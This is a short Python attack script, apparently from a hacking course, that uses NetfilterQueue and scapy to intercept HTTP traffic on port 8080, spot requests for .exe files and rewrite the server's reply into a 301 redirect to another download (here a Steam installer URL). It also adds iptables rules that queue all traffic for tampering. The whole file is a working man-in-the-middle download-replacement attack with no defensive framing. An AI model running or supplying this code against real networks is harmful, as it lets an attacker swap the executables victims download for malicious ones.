from netfilterqueue import NetfilterQueue
import subprocess
import scapy.all as scapy

# http == port 80

queue = NetfilterQueue()
ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:

            if scapy_packet[scapy.TCP].dport == 8080:
                if (
                    ".exe" in str(scapy_packet[scapy.Raw].load.decode())
                    and "192.168.0.122" not in scapy_packet[scapy.Raw].load
                ):
                    print("[+].exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 8080:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    scapy_packet = replace_file(scapy_packet)
                    packet.set_payload(bytes(scapy_packet))
                    print("[+]File replaced")
        except IndexError:
            pass
    packet.accept()


def replace_file(scapy_packet):
    ack_list.remove(scapy_packet[scapy.TCP].seq)
    print("[+]Replacing file")
    scapy_packet[
        scapy.Raw
    ].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://cdn.cloudflare.steamstatic.com/client/installer/SteamSetup.exe\n\n"
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


def create_iptables_queue():
    print("[+]Creating iptables queue")
    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    subprocess.run(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    print("[+]Done")


queue.bind(1, process_packet)
try:
    create_iptables_queue()
    queue.run()
except KeyboardInterrupt:
    print("[+]Restoring iptables...")
    subprocess.run(["iptables", "--flush"])
    print("[+]Stopping web server")
    subprocess.run(["service", "apache2", "stop"])
    print("[+]Done")
